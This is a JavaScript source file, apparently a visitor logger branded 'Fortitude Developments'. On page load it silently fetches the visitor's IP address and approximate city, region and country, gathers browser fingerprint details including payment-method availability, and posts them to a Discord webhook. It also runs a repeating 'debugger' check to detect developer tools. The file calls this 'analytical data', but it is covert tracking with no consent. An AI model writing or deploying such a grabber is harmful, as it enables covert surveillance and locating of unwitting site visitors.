const DISCORD_WEBHOOK_URL = "";

let devtoolsOpen = false;

const detectDevTools = () => {
    const startTime = performance.now();
    debugger;
    if (performance.now() - startTime > 10) {
        devtoolsOpen = true;
        console.warn("[DEBUG] Developer tools have been opened.");
        console.log("[DEBUG] Debugging mode activated.");
    }
};

setInterval(detectDevTools, 1000);

async function collectData() {
    const ipData = await fetch("https://api64.ipify.org?format=json").then(res => res.json()).catch(() => ({ ip: "Unknown" }));

    const userAgent = navigator.userAgent || "Unknown";
    const webkit = 'WebkitAppearance' in document.documentElement.style;
    const os = navigator.platform || "Unknown";
    const browserVersion = navigator.appVersion || "Unknown";
    const darkModeEnabled = window.matchMedia && window.matchMedia("(prefers-color-scheme: dark)").matches;
    const cookiesEnabled = navigator.cookieEnabled;
    const indexedDBEnabled = "indexedDB" in window;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
    const googlePayEnabled = !!window.PaymentRequest && navigator.userAgent.includes("Google");
    const applePayEnabled = !!window.ApplePaySession;
    
    const locationData = await fetch("https://ipapi.co/json/").then(res => res.json()).catch(() => ({
        city: "Unknown",
        region: "Unknown",
        country: "Unknown"
    }));

    const generalLocation = `${locationData.city}, ${locationData.region}, ${locationData.country}`;

    const logTime = new Date().toLocaleString();

    const payload = {
        username: "⚝ Fortitude Developments",
        avatar_url: "https://dev-fortitude.github.io/Site/assets/branding/logo.png",
        embeds: [{
            title: "Fortitude Developments ⚝ Analytical Data",
            description: "Data package has been processed and saved to Your private servers",
            color: 3447003,
            fields: [
                { name: "ℹ️IP Address", value: `\`${ipData.ip}\``, inline: true },
                { name: "UserAgent", value: `\`${userAgent}\``, inline: false },
                { name: "WebKit", value: `\`${webkit}\``, inline: true },
                { name: "Operating System", value: `\`${os}\``, inline: true },
                { name: "Browser Version", value: `\`${browserVersion}\``, inline: false },
                { name: "Dark Mode Enabled", value: `\`${darkModeEnabled}\``, inline: true },
                { name: "Cookies Enabled", value: `\`${cookiesEnabled}\``, inline: true },
                { name: "IndexedDB Enabled", value: `\`${indexedDBEnabled}\``, inline: true },
                { name: "General Location", value: `\`${generalLocation}\``, inline: false },
                { name: "Timezone", value: `\`${timezone}\``, inline: true },
                { name: "Google Pay Enabled", value: `\`${googlePayEnabled}\``, inline: true },
                { name: "Apple Pay Enabled", value: `\`${applePayEnabled}\``, inline: true },
            ],
            footer: {
                text: `Logged at: ${logTime}`
            }
        }]
    };

    fetch(DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
    }).then(() => console.log("[INFO] Data successfully sent to Discord webhook."))
      .catch(err => console.error("[ERROR] Failed to send data:", err));
}

window.onload = collectData;